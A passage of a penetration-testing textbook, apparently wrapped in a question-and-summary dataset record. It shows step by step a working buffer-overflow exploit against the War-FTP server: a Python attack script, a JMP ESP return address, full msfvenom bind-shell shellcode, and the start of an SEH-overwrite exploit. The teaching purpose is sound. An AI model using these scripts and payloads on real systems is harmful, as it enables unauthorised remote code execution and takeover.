select Follow in Stack. The stack is shown in the bottom right of the\nImmunity Debugger window. Scroll up a few lines, as shown in Figure 17-10. Notice that the line above ESP also contains four Cs, and above that\nare four Bs for the return address. This tells us that we need to start our\nmalicious instructions for the CPU to execute four bytes into our Cs in the\nattack string (because ESP is four bytes into the Cs); otherwise, the first\nfour bytes of our shellcode will be missed. (This sort of scenario will come\nup frequently because these four Cs are caused by a calling convention and\nindicate that the function has cleaned-up arguments.)\nnote Calling conventions are a set of rules implemented in a compiler, describing how a\nchild function will receive arguments from its caller function. Some conventions will\ncause the caller function to remove the arguments from the stack, while others state\nthat the child function must remove the arguments. The latter will cause one or more\ndwords (depending on the number of arguments) to be skipped on the stack automati-\ncally, as shown in Figure 17-10, as soon as the child function ends. 390 Chapter 17\nFigure 17-10: ESP controlled by the attack string\nNow we can just put 00AFFD48 into the return address, replace our Cs\nwith shellcode, and we will have a complete exploit, right? Close, but not\nquite. Unfortunately, if we just hardcode the address 00AFFD48 into our\nreturn address, the exploit may work just fine for us but not in other cases—\nand we want it to work as universally as possible. As we saw in Chapter 16,\nthe locations of registers like ESP can change based on program factors\nsuch as the length of provided arguments or because the stack is tied to a\nthread, which means the stack address can differ the next time you attack\nthe application. Lucky for us, jumping to a CPU register to execute its con-\ntents is denoted by the assembly language instruction JMP ESP (or another\nregister name, as needed). In pre-ASLR operating systems, such as our\nWindows XP SP3 target, Windows DLLs were loaded into the same place\nin memory every time.\n\nThat means if we find a JMP ESP inside an executable\nmodule on our Windows XP target, it should be in the same place on every\nWindows XP SP3 English-language machine. For that matter, JMP ESP is not our only option. As long as we end up with\nexecution pointed to ESP, we can use an equivalent instruction to JMP ESP or\neven a series of instructions. For example, CALL ESP will work, or PUSH ESP fol-\nlowed by RET, which sends execution to the memory address in ESP. We can find all the occurrences of JMP ESP and the logical equivalents in\nthe executable modules for War-FTP with the command !mona jmp -r esp, as\nshown in Figure 17-11. A Stack-Based Buffer Overflow in Windows 391\nFigure 17-11: Searching for JMP ESP with Mona\nThe results are written to C:\\logs\\war-ftpd\\jmp.txt. We are presented with\n84 possible JMP ESP (or equivalent) instructions. Some may contain bad\ncharacters (as we’ll discuss later in the chapter)—which instructions should\nwe choose? As a rule of thumb, go for modules that belong to the applica-\ntion itself and not to the operating system. If that is not possible, try rela-\ntively stable modules such MSVCRT.dll because very few changes have been\nmade to this module in Windows patches compared with other Windows\nmodules (although changes are still possible based on the language of the\noperating system). The JMP ESP instructions Mona found in MSVCRT.dll are\nshown next. 0x77c35459 : push esp # ret | {PAGE_EXECUTE_READ} [MSVCRT.dll] ASLR: False, Rebase: False,\nSafeSEH: True, OS: True, v7.0.2600.5512 (C:\\WINDOWS\\system32\\MSVCRT.dll)\n0x77c354b4 : push esp # ret | {PAGE_EXECUTE_READ} [MSVCRT.dll] ASLR: False, Rebase: False,\nSafeSEH: True, OS: True, v7.0.2600.5512 (C:\\WINDOWS\\system32\\MSVCRT.dll)\n0x77c35524 : push esp # ret | {PAGE_EXECUTE_READ} [MSVCRT.dll] ASLR: False, Rebase: False,\nSafeSEH: True, OS: True, v7.0.2600.5512 (C:\\WINDOWS\\system32\\MSVCRT.dll)\n0x77c51025 : push esp # ret | {PAGE_EXECUTE_READ} [MSVCRT.dll] ASLR: False, Rebase: False,\nSafeSEH: True, OS: True, v7.0.2600.5512 (C:\\WINDOWS\\system32\\MSVCRT.dll)\n392 Chapter 17\nLet’s use the first one: the PUSH ESP followed by a RET at 0x77C35459. As in\nChapter 16, we can set a breakpoint to pause execution when we reach our\ninstructions to redirect execution to ESP and make sure everything is work-\ning correctly before we replace our Cs with instructions to be executed. Set a breakpoint at the memory address 0x77C35459 with the command bp\n0x77C35459 in Immunity Debugger, as shown in Figure 17-12. (To view all cur-\nrently set breakpoints, go to View4Breakpoints in Immunity Debugger.)\nFigure 17-12: Breakpoints in Immunity Debugger\nNow replace the four Bs in your exploit string with the location of the\nredirection to ESP, as shown in Listing 17-5. root@kali:~# cat ftpexploit\n#!/usr/bin/python\nimport socket\nbuffer = \"A\" * 485 + \"\\x59\\x54\\xc3\\x77\" + \"C\" * 4 + \"D\" * 607 u\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\nconnect=s.connect(('192.168.20.10',21))\nresponse = s.recv(1024)\nA Stack-Based Buffer Overflow in Windows 393\nprint response\ns.send('USER ' + buffer + '\\r\\n')\nresponse = s.recv(1024)\nprint response\ns.send('PASS PASSWORD\\r\\n')\ns.close()\nListing 17-5: Using a return address from an executable module\nWith a breakpoint prepared, let’s place our new return address at the\nright location in our attack string at u and change the 611 Cs to four Cs\nfollowed by 607 Ds to account for the four bytes of the attack string before\nESP. Once the attack string is in place, run the exploit against War-FTP,\nand see if it reaches our breakpoint in Immunity Debugger, as shown in\nFigure 17-13. Figure 17-13: We reached our breakpoint. Perfect—notice in the bottom of the Immunity Debugger window that\nwe hit our breakpoint. note If you forget to take endianness into account, you might not reach your breakpoint;\ninstead, the program will crash with an access violation at 5954C377. Be sure to flip\nthe bytes around to little-endian format. 394 Chapter 17\nThe next command to be executed is shown in the top left of the\nImmunity Debugger window in the CPU pane. Use F7 to execute one com-\nmand at a time rather than have the program continue running normally. We press F7 twice to execute the PUSH ESP and RET instructions, and, as\nexpected, execution is redirected to the beginning of our Ds (44 in hex),\nas shown in Figure 17-14. Figure 17-14: Redirecting execution to our attack string\ngetting a shell\nNow we just need to put something useful in place of the Ds from the\nprevious section for the CPU to execute on our behalf. In Chapter 4, we\nused the Metasploit tool Msfvenom to generate malicious executables. We\ncan also use it to create raw shellcode to put in our handwritten exploits. For instance, we can tell our hijacked CPU to open a bind shell on TCP\nport 4444 (or any other port) by using Msfvenom to generate the shellcode\nfor a Metasploit payload. We need to tell Msfvenom the payload to use—in this case windows/\nshell_bind_tcp, the inline Windows command shell. We also need to provide\nit with the maximum size we can have for our shellcode. A Stack-Based Buffer Overflow in Windows 395\nnote As you experiment with crashing War-FTP, you will notice that you can actually make\nthe attack string slightly bigger, but things start to act strangely around 1,150 charac-\nters. (We will see what this is all about in Chapter 18.) At 1,100 characters we are\nsafe, and our exploit will work as expected each time. Our current exploit string has 607 Ds, so we have 607 bytes for our\nshellcode. Finally, we need to tell Msfvenom which special characters to\navoid when creating the payload. In this case, we need to avoid the null byte\n(\\x00), carriage return (\\x0d), line feed (\\x0a), and @ (\\x40). note Finding bad characters is an advanced topic beyond the scope of this book, so just\ntrust me that these are the right ones for this exploit. These bad characters make\nsense: The null byte terminates a string, carriage return and line feed denote\na new line, and @ will break the user@server syntax for an FTP login. For\nmore information on this topic, check out my blog post “Finding Bad Characters\nwith Immunity Debugger and Mona.py” (http://www.bulbsecurity.com/\nfinding-bad-characters-with-immunity-debugger-and-mona-py/). Feed this information into Msfvenom, as shown in Listing 17-6. root@kali:~# msfvenom -p windows/shell_bind_tcp -s 607 -b '\\x00\\x40\\x0a\\x0d'\n[*] x86/shikata_ga_nai succeeded with size 368 (iteration=1)\nbuf =\n\"\\xda\\xd4\\xd9\\x74\\x24\\xf4\\xba\\xa6\\x39\\x94\\xcc\\x5e\\x2b\\xc9\" +\n\"\\xb1\\x56\\x83\\xee\\xfc\\x31\\x56\\x14\\x03\\x56\\xb2\\xdb\\x61\\x30\" +\n\"\\x52\\x92\\x8a\\xc9\\xa2\\xc5\\x03\\x2c\\x93\\xd7\\x70\\x24\\x81\\xe7\" +\n\"\\xf3\\x68\\x29\\x83\\x56\\x99\\xba\\xe1\\x7e\\xae\\x0b\\x4f\\x59\\x81\" +\n\"\\x8c\\x61\\x65\\x4d\\x4e\\xe3\\x19\\x8c\\x82\\xc3\\x20\\x5f\\xd7\\x02\" +\n\"\\x64\\x82\\x17\\x56\\x3d\\xc8\\x85\\x47\\x4a\\x8c\\x15\\x69\\x9c\\x9a\" +\n\"\\x25\\x11\\x99\\x5d\\xd1\\xab\\xa0\\x8d\\x49\\xa7\\xeb\\x35\\xe2\\xef\" +\n\"\\xcb\\x44\\x27\\xec\\x30\\x0e\\x4c\\xc7\\xc3\\x91\\x84\\x19\\x2b\\xa0\" +\n\"\\xe8\\xf6\\x12\\x0c\\xe5\\x07\\x52\\xab\\x15\\x72\\xa8\\xcf\\xa8\\x85\" +\n\"\\x6b\\xad\\x76\\x03\\x6e\\x15\\xfd\\xb3\\x4a\\xa7\\xd2\\x22\\x18\\xab\" +\n\"\\x9f\\x21\\x46\\xa8\\x1e\\xe5\\xfc\\xd4\\xab\\x08\\xd3\\x5c\\xef\\x2e\" +\n\"\\xf7\\x05\\xb4\\x4f\\xae\\xe3\\x1b\\x6f\\xb0\\x4c\\xc4\\xd5\\xba\\x7f\" +\n\"\\x11\\x6f\\xe1\\x17\\xd6\\x42\\x1a\\xe8\\x70\\xd4\\x69\\xda\\xdf\\x4e\" +\n\"\\xe6\\x56\\xa8\\x48\\xf1\\x99\\x83\\x2d\\x6d\\x64\\x2b\\x4e\\xa7\\xa3\" +\n\"\\x7f\\x1e\\xdf\\x02\\xff\\xf5\\x1f\\xaa\\x2a\\x59\\x70\\x04\\x84\\x1a\" +\n\"\\x20\\xe4\\x74\\xf3\\x2a\\xeb\\xab\\xe3\\x54\\x21\\xda\\x23\\x9b\\x11\" +\n\"\\x8f\\xc3\\xde\\xa5\\x3e\\x48\\x56\\x43\\x2a\\x60\\x3e\\xdb\\xc2\\x42\" +\n\"\\x65\\xd4\\x75\\xbc\\x4f\\x48\\x2e\\x2a\\xc7\\x86\\xe8\\x55\\xd8\\x8c\" +\n\"\\x5b\\xf9\\x70\\x47\\x2f\\x11\\x45\\x76\\x30\\x3c\\xed\\xf1\\x09\\xd7\" +\n\"\\x67\\x6c\\xd8\\x49\\x77\\xa5\\x8a\\xea\\xea\\x22\\x4a\\x64\\x17\\xfd\" +\n\"\\x1d\\x21\\xe9\\xf4\\xcb\\xdf\\x50\\xaf\\xe9\\x1d\\x04\\x88\\xa9\\xf9\" +\n\"\\xf5\\x17\\x30\\x8f\\x42\\x3c\\x22\\x49\\x4a\\x78\\x16\\x05\\x1d\\xd6\" +\n\"\\xc0\\xe3\\xf7\\x98\\xba\\xbd\\xa4\\x72\\x2a\\x3b\\x87\\x44\\x2c\\x44\" +\n\"\\xc2\\x32\\xd0\\xf5\\xbb\\x02\\xef\\x3a\\x2c\\x83\\x88\\x26\\xcc\\x6c\" +\n\"\\x43\\xe3\\xfc\\x26\\xc9\\x42\\x95\\xee\\x98\\xd6\\xf8\\x10\\x77\\x14\" +\n\"\\x05\\x93\\x7d\\xe5\\xf2\\x8b\\xf4\\xe0\\xbf\\x0b\\xe5\\x98\\xd0\\xf9\" +\n\"\\x09\\x0e\\xd0\\x2b\"\nListing 17-6: Generating shellcode with Msfvenom\n396 Chapter 17\nMsfvenom generated our shellcode in 368 bytes, leaving us plenty of\nroom to spare. Replace the Ds in the exploit with the generated shellcode,\nas shown in Listing 17-7.\n\nroot@kali:~# cat ftpexploit\n#!/usr/bin/python\nimport socket\nshellcode = (\"\\xda\\xd4\\xd9\\x74\\x24\\xf4\\xba\\xa6\\x39\\x94\\xcc\\x5e\\x2b\\xc9\" +\n\"\\xb1\\x56\\x83\\xee\\xfc\\x31\\x56\\x14\\x03\\x56\\xb2\\xdb\\x61\\x30\" +\n\"\\x52\\x92\\x8a\\xc9\\xa2\\xc5\\x03\\x2c\\x93\\xd7\\x70\\x24\\x81\\xe7\" +\n\"\\xf3\\x68\\x29\\x83\\x56\\x99\\xba\\xe1\\x7e\\xae\\x0b\\x4f\\x59\\x81\" +\n\"\\x8c\\x61\\x65\\x4d\\x4e\\xe3\\x19\\x8c\\x82\\xc3\\x20\\x5f\\xd7\\x02\" +\n\"\\x64\\x82\\x17\\x56\\x3d\\xc8\\x85\\x47\\x4a\\x8c\\x15\\x69\\x9c\\x9a\" +\n\"\\x25\\x11\\x99\\x5d\\xd1\\xab\\xa0\\x8d\\x49\\xa7\\xeb\\x35\\xe2\\xef\" +\n\"\\xcb\\x44\\x27\\xec\\x30\\x0e\\x4c\\xc7\\xc3\\x91\\x84\\x19\\x2b\\xa0\" +\n\"\\xe8\\xf6\\x12\\x0c\\xe5\\x07\\x52\\xab\\x15\\x72\\xa8\\xcf\\xa8\\x85\" +\n\"\\x6b\\xad\\x76\\x03\\x6e\\x15\\xfd\\xb3\\x4a\\xa7\\xd2\\x22\\x18\\xab\" +\n\"\\x9f\\x21\\x46\\xa8\\x1e\\xe5\\xfc\\xd4\\xab\\x08\\xd3\\x5c\\xef\\x2e\" +\n\"\\xf7\\x05\\xb4\\x4f\\xae\\xe3\\x1b\\x6f\\xb0\\x4c\\xc4\\xd5\\xba\\x7f\" +\n\"\\x11\\x6f\\xe1\\x17\\xd6\\x42\\x1a\\xe8\\x70\\xd4\\x69\\xda\\xdf\\x4e\" +\n\"\\xe6\\x56\\xa8\\x48\\xf1\\x99\\x83\\x2d\\x6d\\x64\\x2b\\x4e\\xa7\\xa3\" +\n\"\\x7f\\x1e\\xdf\\x02\\xff\\xf5\\x1f\\xaa\\x2a\\x59\\x70\\x04\\x84\\x1a\" +\n\"\\x20\\xe4\\x74\\xf3\\x2a\\xeb\\xab\\xe3\\x54\\x21\\xda\\x23\\x9b\\x11\" +\n\"\\x8f\\xc3\\xde\\xa5\\x3e\\x48\\x56\\x43\\x2a\\x60\\x3e\\xdb\\xc2\\x42\" +\n\"\\x65\\xd4\\x75\\xbc\\x4f\\x48\\x2e\\x2a\\xc7\\x86\\xe8\\x55\\xd8\\x8c\" +\n\"\\x5b\\xf9\\x70\\x47\\x2f\\x11\\x45\\x76\\x30\\x3c\\xed\\xf1\\x09\\xd7\" +\n\"\\x67\\x6c\\xd8\\x49\\x77\\xa5\\x8a\\xea\\xea\\x22\\x4a\\x64\\x17\\xfd\" +\n\"\\x1d\\x21\\xe9\\xf4\\xcb\\xdf\\x50\\xaf\\xe9\\x1d\\x04\\x88\\xa9\\xf9\" +\n\"\\xf5\\x17\\x30\\x8f\\x42\\x3c\\x22\\x49\\x4a\\x78\\x16\\x05\\x1d\\xd6\" +\n\"\\xc0\\xe3\\xf7\\x98\\xba\\xbd\\xa4\\x72\\x2a\\x3b\\x87\\x44\\x2c\\x44\" +\n\"\\xc2\\x32\\xd0\\xf5\\xbb\\x02\\xef\\x3a\\x2c\\x83\\x88\\x26\\xcc\\x6c\" +\n\"\\x43\\xe3\\xfc\\x26\\xc9\\x42\\x95\\xee\\x98\\xd6\\xf8\\x10\\x77\\x14\" +\n\"\\x05\\x93\\x7d\\xe5\\xf2\\x8b\\xf4\\xe0\\xbf\\x0b\\xe5\\x98\\xd0\\xf9\" +\n\"\\x09\\x0e\\xd0\\x2b\")\nbuffer = \"A\" * 485 + \"\\x59\\x54\\xc3\\x77\" + \"C\" * 4 + shellcode\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\nconnect=s.connect(('192.168.20.10',21))\nresponse = s.recv(1024)\nprint response\ns.send('USER ' + buffer + '\\r\\n')\nresponse = s.recv(1024)\nprint response\ns.send('PASS PASSWORD\\r\\n')\ns.close()\nListing 17-7: Our finished exploit\nWhen you try running the exploit, something unexpected happens. Though we are still able to hit our breakpoint and redirect execution to our\nshellcode, War-FTP crashes before we receive our bind shell on port 4444. Something in the shellcode is causing a crash, as shown in Figure 17-15. A Stack-Based Buffer Overflow in Windows 397\nFigure 17-15: War-FTP crashes\nMsfvenom’s encoded shellcode needs to first decode itself before\nexecuting, and as part of the decoding process, it needs to find its loca-\ntion in memory using a routine called getPC. A common technique for\nfinding the current location in memory includes using an instruction\ncalled FSTENV, which writes a structure onto the stack, overwriting what’s\nthere—in our case part of the shellcode. All we need to do to fix this is\nmove ESP away from the shellcode, so getPC has room to work without\ncorrupting our shellcode. (The problem in general is that if the values in\nEIP and ESP are too close together, shellcode tends to corrupt itself, either\nduring decoding or during execution.) This is what caused our crash in\nthe previous run. We can use the Metasm utility to turn a simple assembly instruction\ninto shellcode that we can drop into our exploit. We need to move ESP\naway from our shellcode in memory. We can do this using the assembly ADD\ninstruction. The syntax is ADD destination, amount. Because our stack con-\nsumes lower memory addresses, let’s subtract 1,500 bytes from ESP. The\nnumber of bytes should be large enough to avoid corruption; 1,500 bytes is\nusually a safe choice. Change directories to /usr/share/metasploit-framework/tools and start\nmetasm_shell.rb, as shown in Listing 17-8. 398 Chapter 17\nroot@kali:~# cd /usr/share/metasploit-framework/tools/\nroot@kali:/usr/share/metasploit-framework/tools# ./metasm_shell.rb\ntype \"exit\" or \"quit\" to quit\nuse \";\" or \"\\n\" for newline\nmetasm > sub esp, 1500u\n\"\\x81\\xec\\xdc\\x05\\x00\\x00\"\nmetasm > add esp, -1500v\n\"\\x81\\xc4\\x24\\xfa\\xff\\xff\"\nListing 17-8: Generating shellcode with Metasm\nIf we try sub esp, 1500 u, the resulting shellcode includes null bytes,\nand, as discussed earlier, a null byte is a bad character that needs to be\navoided due to the FTP specification. Instead, enter add esp, -1500 v\n(a logical equivalent) into the metasm prompt. Now add the resulting shellcode to the exploit right before the windows/\nshell_bind_tcp shellcode, as shown in Listing 17-9.",
    "question": "What is the process for hijacking execution in a stack-based buffer overflow vulnerability in a Windows-based FTP server?",
    "summary": "This chapter explains how to exploit a stack-based buffer overflow in a Windows FTP server by overwriting the return address with a malicious value. It details the process of identifying the overflow location using a debugger and generating shellcode to redirect execution. The example uses a crafted attack string to cause the overflow and then manipulates the stack to execute the shellcode successfully."
  },
  {
    "start": 113,
    "end": 116,
    "text": "#!/usr/bin/python\nimport socket\nshellcode = (\"\\xda\\xd4\\xd9\\x74\\x24\\xf4\\xba\\xa6\\x39\\x94\\xcc\\x5e\\x2b\\xc9\" +\n\"\\xb1\\x56\\x83\\xee\\xfc\\x31\\x56\\x14\\x03\\x56\\xb2\\xdb\\x61\\x30\" +\n\"\\x52\\x92\\x8a\\xc9\\xa2\\xc5\\x03\\x2c\\x93\\xd7\\x70\\x24\\x81\\xe7\" +\n\"\\xf3\\x68\\x29\\x83\\x56\\x99\\xba\\xe1\\x7e\\xae\\x0b\\x4f\\x59\\x81\" +\n\"\\x8c\\x61\\x65\\x4d\\x4e\\xe3\\x19\\x8c\\x82\\xc3\\x20\\x5f\\xd7\\x02\" +\n\"\\x64\\x82\\x17\\x56\\x3d\\xc8\\x85\\x47\\x4a\\x8c\\x15\\x69\\x9c\\x9a\" +\n\"\\x25\\x11\\x99\\x5d\\xd1\\xab\\xa0\\x8d\\x49\\xa7\\xeb\\x35\\xe2\\xef\" +\n\"\\xcb\\x44\\x27\\xec\\x30\\x0e\\x4c\\xc7\\xc3\\x91\\x84\\x19\\x2b\\xa0\" +\n\"\\xe8\\xf6\\x12\\x0c\\xe5\\x07\\x52\\xab\\x15\\x72\\xa8\\xcf\\xa8\\x85\" +\n\"\\x6b\\xad\\x76\\x03\\x6e\\x15\\xfd\\xb3\\x4a\\xa7\\xd2\\x22\\x18\\xab\" +\n\"\\x9f\\x21\\x46\\xa8\\x1e\\xe5\\xfc\\xd4\\xab\\x08\\xd3\\x5c\\xef\\x2e\" +\n\"\\xf7\\x05\\xb4\\x4f\\xae\\xe3\\x1b\\x6f\\xb0\\x4c\\xc4\\xd5\\xba\\x7f\" +\n\"\\x11\\x6f\\xe1\\x17\\xd6\\x42\\x1a\\xe8\\x70\\xd4\\x69\\xda\\xdf\\x4e\" +\n\"\\xe6\\x56\\xa8\\x48\\xf1\\x99\\x83\\x2d\\x6d\\x64\\x2b\\x4e\\xa7\\xa3\" +\n\"\\x7f\\x1e\\xdf\\x02\\xff\\xf5\\x1f\\xaa\\x2a\\x59\\x70\\x04\\x84\\x1a\" +\n\"\\x20\\xe4\\x74\\xf3\\x2a\\xeb\\xab\\xe3\\x54\\x21\\xda\\x23\\x9b\\x11\" +\n\"\\x8f\\xc3\\xde\\xa5\\x3e\\x48\\x56\\x43\\x2a\\x60\\x3e\\xdb\\xc2\\x42\" +\n\"\\x65\\xd4\\x75\\xbc\\x4f\\x48\\x2e\\x2a\\xc7\\x86\\xe8\\x55\\xd8\\x8c\" +\n\"\\x5b\\xf9\\x70\\x47\\x2f\\x11\\x45\\x76\\x30\\x3c\\xed\\xf1\\x09\\xd7\" +\n\"\\x67\\x6c\\xd8\\x49\\x77\\xa5\\x8a\\xea\\xea\\x22\\x4a\\x64\\x17\\xfd\" +\n\"\\x1d\\x21\\xe9\\xf4\\xcb\\xdf\\x50\\xaf\\xe9\\x1d\\x04\\x88\\xa9\\xf9\" +\n\"\\xf5\\x17\\x30\\x8f\\x42\\x3c\\x22\\x49\\x4a\\x78\\x16\\x05\\x1d\\xd6\" +\n\"\\xc0\\xe3\\xf7\\x98\\xba\\xbd\\xa4\\x72\\x2a\\x3b\\x87\\x44\\x2c\\x44\" +\n\"\\xc2\\x32\\xd0\\xf5\\xbb\\x02\\xef\\x3a\\x2c\\x83\\x88\\x26\\xcc\\x6c\" +\n\"\\x43\\xe3\\xfc\\x26\\xc9\\x42\\x95\\xee\\x98\\xd6\\xf8\\x10\\x77\\x14\" +\n\"\\x05\\x93\\x7d\\xe5\\xf2\\x8b\\xf4\\xe0\\xbf\\x0b\\xe5\\x98\\xd0\\xf9\" +\n\"\\x09\\x0e\\xd0\\x2b\")\nbuffer = \"A\" * 485 + \"\\x59\\x54\\xc3\\x77\" + \"C\" * 4 + \"\\x81\\xc4\\x24\\xfa\\xff\\xff\" + shellcode\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\nconnect=s.connect(('192.168.20.10',21))\nresponse = s.recv(1024)\nprint response\ns.send('USER ' + buffer + '\\r\\n')\nA Stack-Based Buffer Overflow in Windows 399\nresponse = s.recv(1024)\nprint response\ns.send('PASS PASSWORD\\r\\n')\ns.close()\nListing 17-9: Exploit with ESP moved out of the way\nWith ESP out of the way, and knowing that our shellcode won’t be cor-\nrupted in the process of being decoded or executed, run the exploit again\nand use Netcat on Kali Linux to connect to TCP port 4444 on the Windows\ntarget, as shown here. root@kali:~# nc 192.168.20.10 4444\nMicrosoft Windows XP [Version 5.1.2600]\n(C) Copyright 1985-2001 Microsoft Corp. C:\\Documents and Settings\\Georgia\\Desktop>\nSure enough, we now have a shell on the Windows target, as shown by\nthe Windows command prompt above. summary\nIn this chapter we used our knowledge from Chapter 16 to exploit a real-\nworld vulnerable program: the War-FTP program with a buffer overflow\nissue in the Username field. We crashed the program and located the return\naddress, and then, instead of hardcoding a memory address for the over-\nwritten return address, we found a JMP ESP instruction in a loaded DLL. We\nthen filled the attacker-controlled ESP register with shellcode generated by\nMsfvenom. Now we’ve managed to hijack control of a real program. In the next chapter, we will look at another Windows exploitation tech-\nnique, structured exception handler overwrites. 400 Chapter 17\n18\nstruCtureD e xCePtion\nHanDler oVerwrites\nWhen something goes wrong and causes a program to\ncrash, it has caused an exception. Accessing an invalid\nmemory location is one type of exception a program\ncan encounter. Windows systems use a method called structured exception handlers (SEH)\nto deal with program exceptions as they arise. SEH are similar to try/catch\nblocks in Java: Code is executed, and if something goes wrong, the function\nstops executing and passes execution to SEH. Each function can have its own SEH registration entry. An SEH registra-\ntion record is eight bytes long, consisting of a pointer to the next SEH record\n(NSEH) followed by the memory address of the exception handler, as illus-\ntrated in Figure 18-1. The list of all the SEH entries is the SEH chain. pointer to the next SEH record\nSEH handler\npointer to the next SEH record\nSEH handler\n\nFFFFFFFF\nSEH handler\nFigure 18-1: SEH structure\nIn many cases, an application uses only the operating system’s SEH\nentry to handle exceptions. You are probably already familiar with this\nusage; it puts up a message box with something like “Application X has\nencountered a problem and needs to close.” However, programs can also\nspecify custom SEH entries. When an exception is encountered, execu-\ntion will be passed to the SEH chain to look for an entry that can handle\nthe exception. To view the SEH chain for an application in Immunity\nDebugger, go to View4SEH chain, as illustrated in Figure 18-2. Figure 18-2: Viewing the SEH chain\n402 Chapter 18\nseh overwrite exploits\nNow let’s look at using SEH entries to take control of a program. A natural\nquestion when working through the War-FTP buffer overflow example in\nChapter 17 would be, Why are we limited to 607 bytes for our shellcode? Why can’t we write an even longer attack string and create a payload that’s\nas long as we like? We’ll begin our exploration of SEH overwrites with the exploit we used\nto crash War-FTP. Instead of the 1,100-byte exploit string that we used in\nthe example in Chapter 17, let’s try crashing War-FTP with a 1,150-byte\nstring of As, as shown in Listing 18-1. root@kali:~# cat ftpexploit2\n#!/usr/bin/python\nimport socket\nbuffer = \"A\" * 1150\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\nconnect=s.connect(('192.168.20.10',21))\nresponse = s.recv(1024)\nprint response\ns.send('USER ' + buffer + '\\r\\n')\nresponse = s.recv(1024)\nprint response\ns.close()\nListing 18-1: War-FTP exploit with 1,150 As\nAs shown in Figure 18-3, the program crashes as expected, but this\ntime our access violation is a bit different from the one in Chapter 17. EIP\npoints to 0x77C3F973, a valid instruction inside MSVCRT.dll. Instead of over-\nwriting the saved return pointer and crashing the program with EIP con-\ntrol, War-FTP crashed writing to memory address 0x00B00000. Notice in the CPU pane that the instruction at 0x77C3F973 is MOV BYTE PTR\nDS:[EAX], 0. Basically, the program is trying to write to the memory loca-\ntion of the value of EAX. Looking at the top right of Immunity Debugger, the\nRegisters pane, we see EAX contains the value 00B00000. Something about our\nattack string seems to have corrupted EAX, because the program is now try-\ning to write to a memory location that is not writable. Without EIP control,\nis this crash still viable? Really long attack strings frequently cause an excep-\ntion by trying to write data off the end of the stack. Before we write off this exploit and move on, take a look at the SEH\nchain. As shown in Figure 18-4, the structured exception handler has\nbeen overwritten with As. Recall that in the event of a crash, execution\nis passed to SEH. Though we were not able to control EIP directly at the\ntime of the crash, perhaps controlling SEH will allow us to still hijack\nexecution. Structured Exception Handler Overwrites 403\nFigure 18-3: A program crashes without EIP control. Figure 18-4: SEH overwritten\nJust as we used Mona to create a cyclic pattern to see which four bytes\noverwrote the saved return pointer in the previous chapter, we will find\nwhich four As are overwriting SEH using the command !mona pattern_create\n1150 in Immunity Debugger, as shown in Figure 18-5. 404 Chapter 18\nFigure 18-5: Generating a cyclic pattern with Mona\nCopy the resulting pattern from C:\\logs\\war-ftpd\\pattern.txt into the\nexploit in place of the 1,150 As, as shown in Listing 18-2. root@kali:~# cat ftpexploit2\n#!/usr/bin/python\nimport socket\nu buffer = \"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2\nAc3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8\nAe9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4\nAh5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0\nAk1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6\nAm7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2\nAp3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8\nAr9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au5Au6\nAu7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2\nAx3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8\nAz9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4\nBc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0\nBf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6\nBh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2\nBk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2B\"\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\nconnect=s.connect(('192.168.20.10',21))\nresponse = s.recv(1024)\nprint response\ns.send('USER ' + buffer + '\\r\\n')\nresponse = s.recv(1024)\nprint response\ns.close()\nListing 18-2: Using pattern generation to pinpoint the SEH overwrite in the attack string\nStructured Exception Handler Overwrites 405\nHere we’ve generated a 1,150-character pattern and replaced the string\nof As at u. Next, restart War-FTP in Immunity Debugger, and run the exploit\nagain. As shown in Figure 18-6, SEH is overwritten with 41317441. Figure 18-6: SEH overwritten with Mona’s pattern\nNow use !mona findmsp to find out where in our 1,150-character attack\nstring the SEH entry is overwritten, as shown in Figure 18-7. Figure 18-7: Finding the SEH overwrite in the cyclic pattern\n406 Chapter 18\nLooking through the log output at 